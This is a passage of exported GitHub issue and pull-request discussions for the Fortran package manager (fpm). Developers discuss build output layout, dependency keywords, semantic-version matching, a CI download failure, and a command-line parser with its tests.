                    "user": "urbanjost",
                    "date": "2020-09-26 16:16:24+00:00",
                    "text": "I new build was being called from run and test, but in the version so far I have left build as-is for the most part so for now the run and test commands just have a placeholder. The build in the version I was expanding upon seems to unconditionally when called. The build of course is the core,  but I was not trying to tackle that till the CLI/new/run/test commands were in place. To match what is in the Haskell fpm it needs to do quite a bit more and is doing a few things that might be intentional or might not be. The *.o files are built with the original file prefix intact -- if name.f90 is built name.f90.o is output; but I have seen this done intentionally to avoid collisions between Fortran and C files of the same basename; the Haskell version builds seperate programs in seperate directories but this one puts everything in the app directory. Not sure if that is an intentional refactoring or needs expanded and so on. So I had too many questions about that and skipped calling it automatically. Considering what you say here I should at least call it if the executable does not exist; so it would be created if not updated. I will make that change and as soon as \"build\" is complete at least for files local to the project directory I think it will be a one-line change to call it unconditionally."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-26 16:51:04+00:00",
                    "text": "Your proposed solution to call build when the app/test doesn't exist seems reasonable until conditional compilation is implemented in build. Matching Haskell fpm behaviour with respect to object files doesn't seem to be a necessary goal."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 00:55:39+00:00",
                    "text": "Changed the PR to call build if executable does not exist with a command that that is temporary. I had made an earlier model that emulated the Haskell version partly because that then gave me existing packages to test against and a pass/fail criteria that it generated the same files.  But the build routine has been expanded since then, and when I call it in some of the existing Haskell fpm packages it fails, but I am not sure if that is intentional or not. Everything goes into app/ and test/ instead of specific directories that mirror the input file path name for example. But I see several other discussions about redoing how files are automatically discovered and how the build/ directory might be restructured and it is not clear to me as to what should be changed so\n\nshould the Fortran fpm be compatible with the Haskell fpm in that it can build any current H-fpm package\nshould the generated files all go into the directories they are currently placed in?\nSo the problem is that as-is a bunch of current fpm packages I have to not build. The gfortran command being built could probably be changed to correct for where the files ARE going, or the files can be re-arranged to go where they do in the Haskell version, which would also change the gfortran command.  It is essentially unclear which way the community plans on this going so I think I am stuck at this point until/if the CLI interface is merged and then the same for this one, and I am not sure when/if that is happening.  So is there a functional spec anywhere that says what F-fpm will do? I wanted to look at whether a topological sort of the build files is reasonable to do in fortran to get the right compile order or if that is already in the current build and I missed it ( I haven't gotten through understanding all of it yet). So I think I am basically frozen at this point (waiting for Gadot).  This will create the same files H-fpm does for the \"new\" command and \"build\", \"run\", and \"test\" it robustly which I was hoping would be merged so the bigger issue of complex builds could be resolved. That would create a functional F-fpm for local projects and only leave the lib-curl  part remaining and non-Fortran.  So you would have to have gfortran and git and probably ar or its equivalent but you could build projects on a relatively normal system (and git isn't really needed to do the development) without having to install Haskell.  I was hoping we would be at that point and refining fpm to be a useful tool for building local projects; and then when the project sharing was enabled that would be the show-stopper. The toml-f package was a huge step forward, and now things seem stalled on simpler issues I thought I could get out of the way. Seems like I am missing something but Fortran needs an easy module sharing mechanism and other package managers have not seemed to catch on with the Fortran community in my experience. Seems like a project plan is missing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-27 07:19:16+00:00",
                    "text": "Thanks for your comments @urbanjost, you raise some good points.\nRegarding the object file paths, I have no objection to matching the behaviour of Haskell fpm; but since I see little benefit to this, beyond allowing side-by-side use of h-fpm and fpm, it isn't something I will be personally addressing soon. Your 'test' for matching object file output between fpm and h-fpm seems quite arbitrary since no promises have been made about the structure of intermediate build files. Am I missing something here? Is there an important reason why you want the intermediate objects to match the Haskell version beyond your test between the two versions?\nFortran fpm can build any H-fpm package that doesn't have any external dependencies or build system - if you have a self-contained package that builds with h-fpm but not with fortran fpm please let me know! If you haven't already, please also see this index of example packages that I put together that summarises the current feature gap between fpm and h-fpm.\nRegarding the topo sort, this is already implemented within the build system via a depth-first search; there are improvements that can be made to this, in particular to enable parallel builds, but this isn't a high priority IMO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 17:54:39+00:00",
                    "text": "In my opinion, no promises about intermediate build files or locations should be made. Even the locations of desired artifacts (e.g. library files or executables) should probably be left unspecified other than where an install command would put them. Ideally, user's should not need to know or rely on such details. Of course Hyrum's Law will almost certainly come into effect pretty quickly, so we should probably at least put some thought into it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 18:19:12+00:00",
                    "text": "There were several comments that supported the goal of making the f-fpm version at first duplicate h-fpm and nothing I could find that clearly stated otherwise so for lack of a better goal I was trying to get it to duplicate the h-fpm version so that I could interchangeably use either h-fpm and f-fpm in the same directory, but that was primarily useful for testing the build functionality that at the time did not exist. Now that I had some time to look I see build is essentially done except for not rebuilding and what you mentioned. Nice job. So I have a bunch that fail but a quick look shows it is probably the same reason. See the trivial build\n   M_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\n\nwhich shows a setup that works with h-fpm and not f-fpm.  After I removed the packages with external dependencies and the ones with custom make files and ones with system dependencies like X11, ncurses that uses an extension in a private version it worked very well on 17 non-trival projects which was quite exciting. In those I could (using PR #189) do  build, build -release, run --list,  test --list, run NAME, test NAME, and your build method worked with the files made with a new command as well, so for local builds it looks great. Several packages only have a custom makefile because they include C code which your version seems to support so I am going to try that. But if f-fpm should be able to build anything h-fpm does if you could take a look at the M_msg module which is the smallest example hitting the problem that would be great.\nIs supporting two languages why the .f90 suffix is left on the relocatable files? Seems to work fine but unexpected; and there was no libNAME.a files which I was not sure if was intentional but as long as using the *.o files works about the only side-effect is a slightly bigger executable.  I have seen leaving the suffix on as a way to avoid conflicts in projects that have NAME.c and NAME.f90 sources going into a single lib.a file but it is rare (actually it was me and I have seen it no where else :>)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-27 19:49:22+00:00",
                    "text": "Apologies, yes I forgot to say that f-fpm also does not yet create static libraries libName.a as you point out.\n\n... it worked very well on 17 non-trival projects ...\n\nI'm glad to hear this!\n\nIs supporting two languages why the .f90 suffix is left on the relocatable files?\n\nYes, although we really only need to leave the suffix on non-fortran files, so it is still possible to have full compatibility with h-fpm in the intermediate files if desired.\n\n... if you could take a look at the M_msg module which is the smallest example hitting the problem that would be great.\n\nI've looked into this and opened an issue (urbanjost/M_msg#1). In summary, the difference in behaviour with h-fpm is because f-fpm does not yet support linking with static libraries."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-12 10:55:32+00:00",
                    "text": "Functionality now implemented."
                }
            ]
        },
        {
            "number": 187,
            "user": "urbanjost",
            "date": "2020-09-22 00:30:58+00:00",
            "title": "Fortran fpm(1) does not take ver= keyword on dependencies",
            "text": "In the Fortran version if you use ver= with a dependency it fails\n[dependencies.M_CLI2]\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\nver = \"a177b0077819571815fa6a8da6980bcb45443858\"\nfpm run --args build\nKey ver is not allowed in dependency M_CLI2\nERROR STOP 1\nError termination. Backtrace:\n#0  0x7fc87742e131 in ???\n#1  0x7fc87742ecd9 in ???\n#2  0x7fc87742fe9b in ???\n#3  0x404570 in fpm_MOD_cmd_build\nat src/fpm.f90:101\n#4  0x401977 in MAIN\nat app/main.f90:22\n#5  0x401a20 in main\nat app/main.f90:8",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 06:05:47+00:00",
                    "text": "For reference, the bootstrap fpm will only use rev, branch or tag for git dependencies.\n\n  \n    \n      fpm/PACKAGING.md\n    \n    \n        Lines 647 to 657\n      in\n      1a394d7\n    \n    \n    \n    \n\n        \n          \n           You can also be specific about which version of a dependency you\u2019d like. You can \n        \n\n        \n          \n           specify a branch to use like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", branch = \"master\" }`, \n        \n\n        \n          \n           or a tag like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", tag = \"v1.2.3\" }`, \n        \n\n        \n          \n           or even a specific commit like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", rev = \"a1b2c3\" }`. \n        \n\n        \n          \n           You can even specify the path to another folder, if for example you\u2019ve got \n        \n\n        \n          \n           another fpm package in the same repository. Like this: \n        \n\n        \n          \n           `helloff = { path = \"helloff\" }`. Note that you should *not* specify paths \n        \n\n        \n          \n           outside of your repository, or things won\u2019t work for your users. \n        \n    \n  \n\n\nEverything else can be specified, but is silently ignored in bootstrap fpm."
                }
            ]
        },
        {
            "number": 186,
            "user": "awvwgk",
            "date": "2020-09-21 21:46:20+00:00",
            "title": "Implement version string validation and comparison",
            "text": "This is probably not immediately useful, therefore I'm opening it as draft for discussion.\nThis PR implements a version type, somewhat similar to Python's StrictVersion, which allows parsing version numbers and comparing them, if they follow a strict format. Version numbers can become complicated, the most involved versioning scheme I have seen so far is the Arch Linux PKGBUILD version, featuring a version epoch, a version number (probably semantic, but not necessarily) and a build number: [<int>:]<int>[.<int>...]-<int>.\nHere support for a version of the form of <int>[.<int>...] is implemented, where the number of subversions is limited to an arbitrarily chosen 10 (probably way too much) 3 (for semantic versioning <major>[.<minor>[.<patch>]]). Have a look at the tests to see what is possible.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 00:24:40+00:00",
                    "text": "I'm a big fan of semantic versioning. This means 3 parts to a version number, <major>.<minor>.<patch>. I think we should at least strongly encourage this for any published fpm packages.\nThe requirements are basically:\n\nAny additions to public interfaces require a minor version bump\nAny backward incompatible change requires a major version bump\n\nIf semantic versioning is followed, users know that patch and minor version updates are safe (won't break anything), and major version upgrades may require some rework."
                },
                {
                    "user": "certik",
                    "date": "2020-09-22 02:12:11+00:00",
                    "text": "You can probably already guess my opinion: I suggest we require semantic versioning, just like Cargo."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 06:24:10+00:00",
                    "text": "I'm all for encouraging semantic versioning. It won't hurt to give fpm at least the ability to make sense from version numbers not strictly following this scheme to make it a more robust.\nA good example is the conda-forge-pinning feedstock, not because it uses a timestamp as version, but because it has a long list of important packages not following semantic versioning."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-22 07:24:47+00:00",
                    "text": "This looks good @awvwgk. I agree that understanding versions will be important in fpm for dependencies.\nI agree with everything that @everythingfunctional has said; semantic versioning is easy and intuitive to understand.\nSince we're starting from scratch here, I also think it makes sense to stick to one version format for all packages - unless there are advantages/requirements for other formats?\nHowever many user packages won't be destined for publishing so I don't think fpm should require a version string for packages or attempt to enforce the rules of semantic versioning beyond the format of the field.\nEnforcement of semantic versioning rules should happen at package registry level (fpm-registry) with fpm simply having helper options to automatically set and bump the version as is required. fpm-registry already requires a version field to be present in package manifests during its CI checks. On PR, fpm-registry can check interfaces against any prior registry versions and throw an error if the rules aren't met. I don't believe this will be difficult to implement in our current checks."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 09:40:03+00:00",
                    "text": "Semantic versioning is fine, up to the point where the developer applying it fails to follow its convention, on purpose or by accident. Also, API breakage is not always a good measure for versioning, not every compatibility breakage is defined by an API or ABI change.\nI'm not advocating against semantic versioning. Just keep in mind that versioning can be complicated and even requiring semantic versioning might not be enough. It would be thoughtful of fpm to allow for some flexibility in this regard, even if it is just to make an already painful job of sorting out dependency versions not more painful."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 15:43:00+00:00",
                    "text": "I very much agree with what @LKedward said. True, semantic versioning isn't bullet proof - despite our best efforts, users can (intentionally or not) end up depending on internal implementation details - but it's still helpful and worth utilizing.\nI could envision allowing some additional info in the version string, but it would not be used for ordering of versions, and for any packages that supply it, that would be a necessary piece for the users of the library to include when specifying a version. The most obvious use case that comes to mind would be different versions for different operating systems, and still allow users use wildcard version specification (i.e. some_lib = '2.*-linux') would match the latest version 2.0 <= x < 3.0 that ends in -linux. Thus, a version string would have the format <major>.<minor>.<patch>[-whatever_you_want] where semantic versioning is still implied between versions with matching -whatever_you_want and there is no ordering implied between different optional endings. Seem reasonable?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 17:35:23+00:00",
                    "text": "Maybe this is just some misunderstanding. Would this mean the version string must match the regex \\d+\\.\\d+\\.\\d+?\n\nThe most obvious use case that comes to mind would be different versions for different operating systems, and still allow users use wildcard version specification (i.e. some_lib = '2.*-linux') would match the latest version 2.0 <= x < 3.0 that ends in -linux.\n\nSorry for derailing this conversation, the better solution than mangling this into the version string would be allowing the registry to specify variants and fpm use them with\nsome_lib.version = \"2\"\nsome_lib.variant = \"linux\""
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 18:09:34+00:00",
                    "text": "I think we could allow the absence of the minor or patch versions to simply imply that they are zero.\nThe variant route might be an interesting approach instead of complicating the version."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 18:44:56+00:00",
                    "text": "I set the maximum subversion limit to three, resulting effectively in \u201csemantic versioning,\u201d with optional minor and patch version.\nAlso implemented a \u201csemantic version\u201d matching for the version date type as well, while trying to keep it as flexible as possible.\nThe match operator between two versions would work like this:\nsome_dep1 = \"2\"  # >=2 and <3\nsome_dep2 = \"0.7\" # >=0.7 and <0.8\nsome_dep3 = \"1.3\" # >=1.3 and <1.4\nsome_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\n# to discuss: version numbers ending on zero\nsome_dep5 = \"2.0\" # currently >=2 and <3, not >=2.1 and <3.1\nThis might not be the best choice to determine the version number to match against:\n\n  \n    \n      fpm/fpm/src/fpm/versioning.f90\n    \n    \n        Lines 366 to 371\n      in\n      5191bef\n    \n    \n    \n    \n\n        \n          \n           do ii = size(rhs%num), 1, -1 \n        \n\n        \n          \n               if (rhs%num(ii) /= 0) then \n        \n\n        \n          \n                   tmp%num = rhs%num(:ii) \n        \n\n        \n          \n                   exit \n        \n\n        \n          \n               end if \n        \n\n        \n          \n           end do \n        \n    \n  \n\n\nProbably, we should not compare against a version data type at all, but have a separate version-constraint data type for this purpose."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-23 06:30:10+00:00",
                    "text": "I do not understand the second part of the explanation:\n\n    some_dep5 = \"2.0\" # currently >= 2 and < 3, not >= 2.1 and < 3\n\nthat is: >= 2.1. But apart from that, I would say that \"2.0\" should be\ninterpreted as >= 2.0.x and < 2.1.\n\n\nOp di 22 sep. 2020 om 20:45 schreef Sebastian Ehlert <\nnotifications@github.com>:\n\u2026\n I set the maximum subversion limit to three, resulting effectively in\n semantic versioning, with optional minor and patch version.\n Also implemented a \u201csemantic version\u201d matching for the version date type\n as well, while trying to keep it as flexible as possible.\n\n The match operator between two versions would work like this:\n\n some_dep1 = \"2\"  # >=2 and <3\n some_dep2 = \"0.7\" # >=0.7 and <0.8\n some_dep3 = \"1.3\" # >=1.3 and <1.4\n some_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\n # to discuss: version numbers ending on zero\n some_dep5 = \"2.0\" # currently >= 2 and < 3, not >= 2.1 and < 3\n\n This might not be the best choice to determine the version number to match\n against:\n\n https://github.com/fortran-lang/fpm/blob/5191befcc8a2c6dd67f0e0ab819b82fa68f39348/fpm/src/fpm/versioning.f90#L366-L371\n\n Probably, we should not compare against a version data type at all, but\n have a separate version-constraint data type for this purpose.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#186 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR3CKLRALOI5CGCYZP3SHDWDRANCNFSM4RVA5MLQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-23 08:52:48+00:00",
                    "text": "Agreed, I'm just using the number of subversions to create the matching now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-23 14:28:02+00:00",
                    "text": "I believe most package managers use a different type for the package version versus the specified version of a dependency. They then use some sort of constraint solver for selecting the appropriate version from the repository/registry.\nI agree with @arjenmarkus that most users would probably expect some_dep = \"2.0\" to mean >= 2.0.0 and < 2.1.0, whereas some_dep = \"2\" would mean >=2.0.0 and <3.0.0."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 19:29:56+00:00",
                    "text": "Thanks for the input and discussion so far. I guess I will just mark it as ready for review now.\nThe .match. operator should now work as expected without surprises:\nsome_dep1 = \"2\"  # >=2 and <3\nsome_dep2 = \"0.7\" # >=0.7 and <0.8\nsome_dep3 = \"1.3\" # >=1.3 and <1.4\nsome_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\nsome_dep5 = \"2.0\" # >=2.0 and <2.1\nAll comparison operators are implemented as elemental, so they should play nicely together with array operations and any or all reductions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 20:20:42+00:00",
                    "text": "Didn't check the code for it, but I think your example\nsome_dep5 = \"2.0\" # >=2.1 and <3.1\n\nshould be\nsome_dep5 = \"2.0\" # >=2.0 and <2.1"
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:18:17+00:00",
                    "text": "@awvwgk, can you please address @everythingfunctional's question, and then resolve conflicts? After that this is ready to merge."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-28 15:34:28+00:00",
                    "text": "Rebased against 90ddc6f"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-29 14:31:52+00:00",
                    "text": "@awvwgk Please merge when ready."
                }
            ]
        },
        {
            "number": 185,
            "user": "LKedward",
            "date": "2020-09-21 19:01:22+00:00",
            "title": "Update: CI workflow",
            "text": "Download stack from github releases page.\nIt turns out that all three OSes on github actions have the latest release (2.3.3) of stack already installed. (See here).\nSo I've simply removed the installation steps.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-21 19:25:56+00:00",
                    "text": "That works. If it breaks we'll fix it later. +1 to meege.\n\u2026\nOn Mon, Sep 21, 2020, at 1:23 PM, Laurence Kedward wrote:\n\n\n @LKedward <https://github.com/LKedward> requested your review on: #185\n <#185> Update: CI workflow.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#185 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWESE6DATSUW2O64TDLSG6R2RANCNFSM4RU4FWJA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:57:47+00:00",
                    "text": "That's super convenient. :)"
                }
            ]
        },
        {
            "number": 184,
            "user": "certik",
            "date": "2020-09-21 15:10:55+00:00",
            "title": "Build failing due to SSL error at get.haskellstack.org",
            "text": "This URL fails to download (even in a browser for me right now) due to some SSL error:\nhttps://get.haskellstack.org/stable/windows-x86_64.zip\nAnd so our CI tests currently fail.\n@everythingfunctional what do you think we should do?\nWe can host the Haskell binaries ourselves for our CI tests.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-21 15:17:33+00:00",
                    "text": "We can host the Haskell binaries ourselves for our CI tests.\n\nThis makes sense; we already do this for the OSX binary right?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:25:54+00:00",
                    "text": "That's right, I forgot about that!\nI won't have time to work on this, but if anyone can upload the Windows and Linux binaries somewhere, so that we can change the links, that would be awesome."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 16:36:34+00:00",
                    "text": "Happy to do it! I just need to find another place to download them from other than haskellstack.org..."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:45:18+00:00",
                    "text": "@LKedward thank you, that would be a huge help!"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 16:45:25+00:00",
                    "text": "I've found binaries on the stack github page:\nhttps://github.com/commercialhaskell/stack/releases/tag/v2.3.3\nI could just replace the download links in the CI workflow file with these? Or would you prefer if we hosted them ourselves?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:46:54+00:00",
                    "text": "Let's just replace them for now. I think the GitHub links should be stable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 18:38:06+00:00",
                    "text": "It looks like haskellstack.org now working again, and the main CI is now passing but I will still open a pull request to replace the stack urls with those from git."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:06:03+00:00",
                    "text": "I think there's an aspect of having one more thing to maintain if we have our own \"mirror\" for the stack binaries, and I don't know if I'd ever expect to have this problem again. You can do it if you want, but I don't know that it's necessary. Whatever you guys think."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 20:28:47+00:00",
                    "text": "Well, I had to upload the macOS binary in the past precisely for this problem. So this is the second time happening, so unfortunately I expect it to happen again.\nThis issue has been fixed by #185."
                }
            ]
        },
        {
            "number": 183,
            "user": "urbanjost",
            "date": "2020-09-21 00:24:36+00:00",
            "title": "haskel version takes commit= keyword on a dependency,  the Fortran prototype does not",
            "text": "Given a dependency with a specific git(1) commit value\n[dependencies.M_CLI2]\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\ncommit = \"a177b0077819571815fa6a8da6980bcb45443858\"\nThe Fortran fpm(1) prototype complains about the commit keyword\nfpm run --args build\nKey commit is not allowed in dependency M_CLI2\nERROR STOP 1\nError termination. Backtrace:\n#0  0x7f9497368131 in ???\n#1  0x7f9497368cd9 in ???\n#2  0x7f9497369e9b in ???\n#3  0x404570 in fpm_MOD_cmd_build\nat src/fpm.f90:101\n#4  0x401977 in MAIN\nat app/main.f90:22\n#5  0x401a20 in main\nat app/main.f90:8\nbut it builds OK with the haskell version\n[urbanjs@localhost fpm]$ fpm build\n[urbanjs@localhost fpm]$\nIt looks like the commit= keyword was not enabled?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-21 05:58:24+00:00",
                    "text": "Apologies, I was mistaken in my suggestion for #181; the correct syntax for specifying a commit is rev=. This is for both versions of fpm.\nHaskell fpm does not verify the manifest file and so won't complain about commit being incorrect."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-21 23:52:10+00:00",
                    "text": "Well, the good and the bad about a full verification. In this case good."
                }
            ]
        },
        {
            "number": 182,
            "user": "urbanjost",
            "date": "2020-09-20 19:51:46+00:00",
            "title": "CLI interface to further development of subcommands",
            "text": "CLI interface to further development of subcommands\npass settings\nextended help for each subcommand\nchange commit= to ver= in fpm.toml\nver= does not work either\nno specific version as ver= does not work for M_CLI2\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\ncomment and clarify CLI unit test\nbasic RUN subcommand\nrestore fpm_command_line.f90 changes\nremove non-zero STOP for no parameters for testing\nspelling error in help\nuse basename to make sure name is a simple name\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\none more time like previous version to see if build error clears on MSWindows\ndebug run to see PC variables\nmake quoting of -- ARGS values less platform dependent and change test accordingly\nchange .gitignore\nRESTORE\nRESTORE FROM BACKUP",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-09-20 20:02:40+00:00",
                    "text": "This should implement the CLI; with the only reference to which parser (M_CLI2)  used is isolated to the fpm_command_line.f90 file.  I ran into what I think is a bug with allocatable character variables of allocatable length but I believe just fixing the length to 4096 resolves that with gfortran, and implements parsing equivalent to all the parameters of the Haskell fpm(1). It should be easy to switch to an alternate parser by changing only fpm_command_line.f90\nI ran into a problem with what appears to be the Fortran TOML interface not recognizing commit= on a dependency as well, which I think shoud be changed in the TOML interface?\nWith this in place it would be a lot easier to move forward on new,run,test for at least a simple module with no dependencies although the \"libcurl\" and \"libgit\" and \"os_system\" interfaces are more significant it is hard to try things out without the CLI interface."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 15:14:55+00:00",
                    "text": "Thanks!\nThe CI tests fail due to #184. We need to fix that."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:41:20+00:00",
                    "text": "I'm still a bit unclear on how exactly to use M_CLI2 (let alone how it works), and it kind of looks like the subcommand aspect isn't a very natural fit (that part is done without the use of M_CLI2).\nBut, since it's working, and is very well isolated from the rest of the code (which is what I was aiming for no matter what solution we used), I'm happy with it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:58:43+00:00",
                    "text": "Does this just need to be rebased after #185 to fix the CI? I think that's what it looks like."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-22 13:13:49+00:00",
                    "text": "OK. Make change to fpm.toml file and added a test of the CLI interface, which gets a little complicated if you want it to actually call a process; so it uses NAMELIST groups to write information from the subprocess back to the original test process but  if you get past the NAMELIST usage it should be a thorough test.\nM_CLI2 is designed with  a more functional/procedural approach.  The documentation on the web site or included in the manpages that come with and around 10 tests on the README hopefully give an idea of how it is more typically used; I tend to go procedural until I have a reason not too so I had a bit of a time figuring out how to best fit it into the model. Never used an ABSTRACT type before, for example. It is totally isolated and in a single module as you said, so it gets things going and should be easy to change out if anyone wants to. Parts of M_CLI2 have been modernized but it was originally written before F90 existed so it might look odd to someone approaching things from an OOP stance. The biggest oddity is a rather primitive dictionary so it could be split out to be stand-alone and the original dictionary code was overkill for just command parsing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-22 13:34:54+00:00",
                    "text": "We need to update the CI scripts to fix the CI checks:\n\nadd --args \"--version\" to the fpm run command\nremove the redundant call to execute build/gfortran_debug/app/fpm\n\nFor ci/run_tests.sh:\ndiff --git a/ci/run_tests.sh b/ci/run_tests.sh\nindex 418fcf2..5e29fa1 100755\n--- a/ci/run_tests.sh\n+++ b/ci/run_tests.sh\n@@ -4,9 +4,8 @@ set -ex\n\n cd fpm\n fpm build\n-fpm run\n+fpm run --args \"--version\"\n fpm test\n-build/gfortran_debug/app/fpm\n\nand similarly for ci/run_tests.bat:\ndiff --git a/ci/run_tests.bat b/ci/run_tests.bat\nindex 92b3cd6..6d4846f 100755\n--- a/ci/run_tests.bat\n+++ b/ci/run_tests.bat\n@@ -6,15 +6,12 @@ if errorlevel 1 exit 1\n fpm build\n if errorlevel 1 exit 1\n \n-fpm run\n+fpm run --args \"--version\"\n if errorlevel 1 exit 1\n \n fpm test\n if errorlevel 1 exit 1\n \n-build\\gfortran_debug\\app\\fpm\n-if errorlevel 1 exit 1\n-\n cd ..\\test\\example_packages\\hello_world\n if errorlevel 1 exit 1"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 16:24:09+00:00",
                    "text": "Thank you for adding the tests. Although I still find it quite hard to follow, what with calling itself recursively and using a file to pass data back. It's hard to see how the given command line corresponds to the expected settings object, or what the expected error is."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-23 22:55:49+00:00",
                    "text": "firefox cannot look at the failure; it displays everything off-screen on my machine; and a tool for doing pull requests is not doing what the documentation indicates it should so I cannot view this to confirm it. On my machines everything works fine. I have some simpler changes to suggest for run, test, and new that I would like to add but they depend on a functioning CLI.  Any help on reviewing this so it can be included or deleted would be appreciated, but at least on my machine I can create a new repository, build, test and run it as long as it is as simple as when the new subcommand produces (no recursive build and build always builds, but actually at least partially functional; but it runs and tests all 22 of the test cases I have so I am looking forward to being able to contribute this so the bigger hurdles of downloading and building complex cases (building only what needs rebuilt) have a full foundation to be tested with."
                },
                {
                    "user": "certik",
                    "date": "2020-09-23 23:07:09+00:00",
                    "text": "The Windows error is:\n2020-09-23T13:23:55.0047154Z # gfortran (for build/gfortran_debug/app/main.o)\n2020-09-23T13:23:55.1149736Z # gfortran (for build/gfortran_debug/app/fpm.exe)\n2020-09-23T13:23:55.4213275Z fpm: Error when running Shake build system:\n2020-09-23T13:23:55.4214301Z   at want, called at src\\Build.hs:114:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4215120Z * Depends on: build/gfortran_debug/test/main/fpm-test.exe\n2020-09-23T13:23:55.4216177Z   at need, called at src\\Build.hs:120:13 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4217038Z * Depends on: build/gfortran_debug/test/main/test_manifest.o\n2020-09-23T13:23:55.4217930Z   at &%>, called at src\\Build.hs:137:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4220034Z * Depends on: build/gfortran_debug/test/main/test_manifest.o build/gfortran_debug/test/main/test_manifest.mod\n2020-09-23T13:23:55.4221105Z   at undefined, called at src\\Build.hs:142:25 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4221924Z   at error, called at libraries\\base\\GHC\\Err.hs:78:14 in base:GHC.Err\n2020-09-23T13:23:55.4222481Z * Raised the exception:\n2020-09-23T13:23:55.4222946Z Prelude.undefined\n\nWhich seems like a bug in our Haskell fpm? @everythingfunctional do you know what the issue is?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 00:52:02+00:00",
                    "text": "Thanks. Cannot think of anything different that would trigger that that was not in one that passed. making some trivial changes to see if a new pull request refreshes something"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 13:46:10+00:00",
                    "text": "A test of a command line parser that does not actually use the command line interface would be incomplete. I could just call the CLI parser directly but that would not check the use of the intrinsics for getting the command line arguments which can be quite different even in a single programming environment. So I think it is a much better test to actually call a program to test a program command line parser but I could be argued out of that.\nIf this is going to\nwork I doubt any single person will understand all the parts without this becoming a single-man project!!  I found the basic layout quite alien at first myself; you have to get out of your comfort zone on collaborative stuff has been my experience; so if anyone has any specific questions about the test I would be glad to answer them or add comments to the test or change the test. It is not so much complicated as uncommon to use Fortran as a shell language; but I use Fortran that way all the time so it of course seems more intuitive. Just think of the calling program as being a shell language being used to call another program that just echoes its parameters out for you to read and verify. That makes it non-recursive. Now, one of the easiest file formats to write group of values out with is NAMELIST, where it takes one line to read and write the whole group, so the test program writes out what was passed to it as a NAMELIST file. That could be anything --- JSON, TOML, etc. but those are not built in to Fortran.\nSo now the \"shell\" (the parent call to the program) just calls the program a bunch of times with different parameters and checks what the program sees after being passed through the system. If the values match it is doing what is expected. That allows you to check every major combination of the parameters the fpm program has virtually directly in about 100 lines so I stand by the approach even though I know it is different.\nI would find fpm unuseable if it can only handle one test file. I have projects that require hundreds, especially ones that 